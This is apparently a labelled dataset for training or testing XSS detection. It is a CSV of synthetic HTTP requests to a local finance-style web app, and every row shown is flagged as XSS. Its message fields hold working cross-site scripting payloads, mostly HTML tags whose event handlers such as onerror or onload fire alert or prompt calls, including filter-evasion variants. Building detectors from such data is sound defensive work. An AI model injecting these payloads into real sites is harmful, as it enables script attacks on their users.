mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"image/png, application/json, text/plain, text/html, */*",429692063336499106,http://127.0.0.1:5000/loan/ce2op2uq,172.21.137.11,31350,DELETE,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E),<img src/onerror=prompt(8)>,true
"text/plain, text/html, image/jpeg, image/png, */*",51197735980778797,http://127.0.0.1:5000/loan/gu60v6hl,10.248.92.120,13075,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,<image src =q onerror=prompt(8)>,true
"image/jpeg, application/json, text/plain, image/png, */*",2056587788142140579,http://127.0.0.1:5000/loan/eug1hebg,10.31.48.56,49222,GET,Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0),<img src =q onerror=prompt(8)>,true
"text/html, image/jpeg, application/json, */*",6786416956869031868,http://127.0.0.1:5000/portfolio/2q30po23,10.144.2.96,67877,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",</scrip</script>t><img src =q onerror=prompt(8)>,true
"image/jpeg, text/plain, text/html, */*",1583375342405261326,http://127.0.0.1:5000/mortgage/kk11q0kc,10.25.65.193,47787,DELETE,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0),"<script\x20type=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, image/jpeg, */*",5037519298444536916,http://127.0.0.1:5000/transaction/rnsurimj,10.8.145.233,76315,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4","<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",true
"text/plain, */*",1210429185701885279,http://127.0.0.1:5000/transaction/ao3n9bta,10.1.201.219,18214,GET,Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1),"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",true
"application/json, */*",866163219521509368,http://127.0.0.1:5000/stock/ocwxrkbj,10.183.23.239,36288,POST,Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0,"<script\x09type=""text/javascript"">javascript:alert(1);</script>",true
"application/json, text/plain, image/jpeg, */*",7185840741862457339,http://127.0.0.1:5000/interest/jaznvsh6,172.28.244.77,1401,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2","<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",true
"image/jpeg, image/png, application/json, text/plain, */*",4633038049833850480,http://127.0.0.1:5000/credit/c6p30oa4,172.19.21.176,21765,DELETE,Mozilla/5.0 (Windows; U; Windows NT 6.1; en-AU; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14,"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",true
"application/json, image/jpeg, text/plain, */*",748011524335292558,http://127.0.0.1:5000/loan/1zxfdqo3,10.172.170.57,86086,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2","<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",true
"application/json, image/png, image/jpeg, text/plain, */*",1399052179470056797,http://127.0.0.1:5000/account/didevv3i,10.97.165.167,74481,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/531.21.11 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10","'`""><\x3Cscript>javascript:alert(1)</script>        ",true
"application/json, text/html, image/jpeg, */*",1339709474844610959,http://127.0.0.1:5000/debit/4ylfebbv,10.245.109.156,60897,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0","'`""><\x00script>javascript:alert(1)</script>",true
"application/json, text/html, text/plain, */*",6265385963585708271,http://127.0.0.1:5000/interest/z05mas7i,10.140.32.41,84697,POST,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17","<img src=1 href=1 onerror=""javascript:alert(1)""></img>",true
"application/json, image/png, image/jpeg, text/plain, */*",3605016946517926825,http://127.0.0.1:5000/interest/df5axtt1,10.93.149.210,27078,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.7) Gecko/20070923 Firefox/2.0.0.7 (Swiftfox),"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",true
"image/png, image/jpeg, */*",2318518451019692577,http://127.0.0.1:5000/stock/dleii4a3,10.35.166.150,44161,GET,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT),"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",true
"image/jpeg, application/json, text/html, text/plain, */*",6532224663167979065,http://127.0.0.1:5000/withdrawal/xlhgxk7r,10.195.184.1,45150,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<body src=1 href=1 onerror=""javascript:alert(1)""></body>",true
"text/html, application/json, image/png, */*",758948615528324897,http://127.0.0.1:5000/fund/ijv5uo97,10.47.214.45,68056,GET,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4 (Kubuntu),"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",true
"image/png, application/json, text/html, image/jpeg, */*",1167680991741085051,http://127.0.0.1:5000/interest/2hqhqw24,172.29.15.247,86134,GET,Opera/9.25 (Windows NT 5.1; U; MEGAUPLOAD 1.0; pt-br),"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",true
"application/json, text/plain, image/png, text/html, */*",7461355743792088938,http://127.0.0.1:5000/dividend/mjiy6td3,10.148.34.18,24842,POST,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",true
"image/png, */*",6011287139088139566,http://127.0.0.1:5000/loan/sdx3ojv5,10.239.152.134,79364,POST,Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1,"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",true
"text/html, image/png, text/plain, */*",7923153836111932970,http://127.0.0.1:5000/credit/cqpr0rai,10.104.43.105,6986,POST,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;),"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",true
"application/json, image/jpeg, image/png, */*",5429868200393954871,http://127.0.0.1:5000/transaction/4n6ddwvk,10.136.178.134,14983,GET,Mozilla/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.12  [en],"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",true
"text/plain, text/html, application/json, */*",7150911091619032643,http://127.0.0.1:5000/loan/3pghv674,10.111.225.202,44116,POST,Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC),"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",true
"image/png, */*",8937016977639642596,http://127.0.0.1:5000/capital/zhwgy0jl,10.17.141.151,26542,GET,"Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221","<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",true
"text/plain, text/html, */*",1431499811444493912,http://127.0.0.1:5000/account/3yoqxhoa,10.241.227.198,54252,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",true
"image/jpeg, */*",1383748005988888221,http://127.0.0.1:5000/market/vfmga8tp,10.12.136.15,83813,POST,Opera/9.23 (Mac OS X; ru),"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",true
"image/jpeg, text/plain, */*",2534857927668363103,http://127.0.0.1:5000/fund/a9b3heud,10.35.8.106,1449,POST,Opera/6.0 (Macintosh; PPC Mac OS X; U),"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",true
"text/html, application/json, image/png, */*",8671754282356995132,http://127.0.0.1:5000/capital/ss8fxql6,10.12.30.91,81412,POST,"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1","<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",true
"application/json, text/plain, */*",3660013959770786479,http://127.0.0.1:5000/transaction/0gie2n80,10.129.71.158,12566,CONNECT,Opera/8.54 (Windows NT 5.0; U; en),"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",true
"text/plain, text/html, */*",502048192902067195,http://127.0.0.1:5000/equity/qmx5jwcz,10.115.5.169,35111,POST,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1,"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",true
"image/png, */*",3981581830552044575,http://127.0.0.1:5000/debit/4mqo8ely,10.57.55.116,71368,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",true
"text/plain, text/html, application/json, */*",8882760998825713058,http://127.0.0.1:5000/withdrawal/zku0ov8t,10.55.108.70,14162,POST,Opera/9.24 (Windows NT 5.1; U; tr),"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",true
"text/html, image/png, */*",7088682774546391570,http://127.0.0.1:5000/loan/pl8mzklt,10.88.6.67,1703,DELETE,Opera/9.10 (Windows NT 6.0; U; en),"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",true
"image/png, text/plain, image/jpeg, text/html, */*",3896813463352221234,http://127.0.0.1:5000/interest/ni8nb0vy,10.156.103.36,5611,GET,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16","<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",true
"text/html, application/json, */*",514495283640259573,http://127.0.0.1:5000/interest/iv5h4phe,10.51.117.185,29369,POST,Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0,"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",true
"image/jpeg, text/plain, */*",4213344744663885516,http://127.0.0.1:5000/credit/48p4wo8k,172.20.158.155,59781,GET,"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30","<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",true
"application/json, image/png, text/html, */*",4420627720668400653,http://127.0.0.1:5000/mortgage/kaf6iung,10.88.172.88,48047,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577","<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",true
"text/plain, text/html, */*",7139646697387675609,http://127.0.0.1:5000/capital/g2uygkuc,172.31.151.157,36871,GET,Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC),"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",true
"image/png, application/json, image/jpeg, text/plain, */*",5340433516245302578,http://127.0.0.1:5000/credit/u3qe4urd,10.108.99.147,45494,POST,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2","<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",true
"application/json, image/png, text/html, */*",5336846686253515528,http://127.0.0.1:5000/market/c034c9rh,10.125.246.4,54713,GET,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [ru],"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",true
"text/plain, image/jpeg, */*",7265873640516119178,http://127.0.0.1:5000/credit/p6d8r454,10.97.212.210,58336,POST,Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0),"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",true
"application/json, */*",8641867742198564778,http://127.0.0.1:5000/interest/5yx6zcy2,10.101.29.15,69726,POST,"Mozilla/5.0 (X11; CrOS i686 13.587.48) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.43 Safari/535.1","<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",true
"image/jpeg, text/html, text/plain, application/json, */*",6486023900494444638,http://127.0.0.1:5000/invest/3e80jxgc,10.38.252.62,82396,CONNECT,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt),"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",true
"text/plain, application/json, image/jpeg, */*",4634562670732111227,http://127.0.0.1:5000/debit/2o7l3ymf,10.126.12.162,1595,POST,Mozilla/5.0 (X11; U; Linux i686; ko-KR; rv:1.8.0.7) Gecko/20060913 Fedora/1.5.0.7-1.fc5 Firefox/1.5.0.7 pango-text,"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",true
"application/json, */*",7549602629190716063,http://127.0.0.1:5000/withdrawal/h8mvp4b4,10.240.13.207,54324,PUT,Opera/7.01 (Windows 98; U)  [fr],"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",true
"image/png, text/html, text/plain, */*",2877128732903050028,http://127.0.0.1:5000/transaction/bwuqtnvl,10.234.74.150,52114,GET,Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.0.5) Gecko/20060731 Ubuntu/dapper-security Firefox/1.5.0.5,"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",true
"application/json, image/jpeg, image/png, text/html, */*",3172662390821327932,http://127.0.0.1:5000/mortgage/03270gcm,10.217.143.67,28191,POST,Opera/9.01 (Windows NT 5.1; U; en),"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",true
"text/plain, image/png, */*",8849218444361512516,http://127.0.0.1:5000/capital/v43rzdqv,172.18.176.255,82846,GET,Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11,"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",true
"text/html, image/jpeg, */*",3603613973871316688,http://127.0.0.1:5000/market/migv3xhw,10.98.59.37,48238,GET,"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10","<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",true
"text/html, application/json, image/jpeg, image/png, */*",8927092164780864037,http://127.0.0.1:5000/account/gyquvzhr,10.82.45.31,54562,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2","<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",true
"text/html, image/png, text/plain, */*",2620830546183174970,http://127.0.0.1:5000/loan/irhm4e1i,10.6.7.144,32601,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.4+ (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1","<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",true
"text/html, text/plain, image/jpeg, */*",1047277663053837868,http://127.0.0.1:5000/credit/b1f0x3ua,10.98.56.143,36772,POST,Opera/9.63 (Windows NT 6.1; U; de) Presto/2.1.1,"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",true
"text/plain, */*",1152356421556980634,http://127.0.0.1:5000/stock/u4ra37lm,10.248.125.49,97301,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.0 Safari/525.19","<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",true
"image/png, image/jpeg, text/plain, text/html, */*",1943401078710888087,http://127.0.0.1:5000/credit/yblnyuev,10.90.7.92,32781,POST,Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre,"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",true
"text/html, */*",1960013414095530702,http://127.0.0.1:5000/account/pgrpwcey,10.216.202.147,76890,POST,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24","<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",true
"image/png, image/jpeg, application/json, text/html, */*",2512883532517951690,http://127.0.0.1:5000/transaction/fhwch1ur,10.63.130.37,62072,POST,Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52,"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",true
"image/png, text/html, */*",8184492513384222142,http://127.0.0.1:5000/stock/odf6pqfb,10.113.147.178,32065,POST,Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.12) Gecko/2009070818 Ubuntu/8.10 (intrepid) Firefox/3.0.12 FirePHP/0.3,"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",true
"image/png, image/jpeg, application/json, */*",8631171578317970041,http://127.0.0.1:5000/credit/k4751lxw,10.179.133.125,61050,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",true
"image/jpeg, */*",4134649390077718992,http://127.0.0.1:5000/credit/wzd28x77,10.35.175.4,7054,OPTIONS,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g","<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",true
"image/png, image/jpeg, text/plain, text/html, */*",3824808255136369208,http://127.0.0.1:5000/capital/e3xvxl70,10.5.143.255,10794,POST,Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20100101 Firefox/4.0b12pre,"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",true
"text/html, text/plain, */*",4328919784029031348,http://127.0.0.1:5000/interest/l76dyqic,10.115.149.125,75175,POST,Opera/5.12 (Windows NT 5.1; U)  [de],"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",true
"image/png, application/json, */*",8467787171348450549,http://127.0.0.1:5000/portfolio/8bc2ofwn,10.179.102.111,5995,POST,Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729),"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",true
"image/png, image/jpeg, text/plain, */*",1933682061308250228,http://127.0.0.1:5000/transaction/kj24gm9a,10.14.38.23,97807,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/125.5 (KHTML, like Gecko) Safari/125.9","<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",true
"image/jpeg, text/plain, image/png, */*",5348002753396909396,http://127.0.0.1:5000/withdrawal/2cplk89a,10.76.23.162,24722,POST,"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Ubuntu/10.10 Chromium/9.0.600.0 Chrome/9.0.600.0 Safari/534.14","<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",true
"application/json, image/jpeg, image/png, text/html, */*",6579038314291177222,http://127.0.0.1:5000/loan/vz619yls,172.16.10.34,52994,GET,"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0","<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",true
"image/png, application/json, text/html, */*",2624282277328573590,http://127.0.0.1:5000/interest/07ftuvpn,10.215.82.23,99670,OPTIONS,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412.7 (KHTML, like Gecko) Safari/412.5_Adobe","<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",true
"text/plain, image/png, application/json, image/jpeg, */*",6188407680775846861,http://127.0.0.1:5000/loan/spu6pa4d,10.240.76.246,86388,POST,Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US),"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",true
"image/jpeg, text/plain, application/json, image/png, */*",8378246516237173190,http://127.0.0.1:5000/debit/b71cp89u,172.17.40.216,77885,POST,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322),"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",true
"text/html, */*",6908834067747630040,http://127.0.0.1:5000/debit/0z6076lg,10.246.41.136,72671,POST,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",true
"application/json, */*",8536746058663555849,http://127.0.0.1:5000/credit/o2bfxco1,10.201.108.235,38486,GET,Mozilla/2.0 (compatible; MSIE 3.01; Windows 95),"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",true
"image/png, image/jpeg, */*",3018520301070596211,http://127.0.0.1:5000/credit/5759u5bm,10.2.2.82,15347,POST,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",true
"text/html, image/png, */*",1360667684318377582,http://127.0.0.1:5000/loan/lzv0xjb2,10.206.65.220,32535,GET,"Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6","<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",true
"text/plain, image/png, text/html, image/jpeg, */*",372674918956259934,http://127.0.0.1:5000/stock/fv458lym,10.198.150.214,14697,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",true
"application/json, text/plain, */*",6078475629130487708,http://127.0.0.1:5000/market/z334ie98,10.238.95.134,92253,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16","<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",true
"application/json, text/plain, image/png, text/html, */*",3196501653738980945,http://127.0.0.1:5000/debit/sana162r,10.98.91.225,41898,GET,Mozilla/5.0 (Windows; U; Windows NT 5.1; fa; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7,"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",true
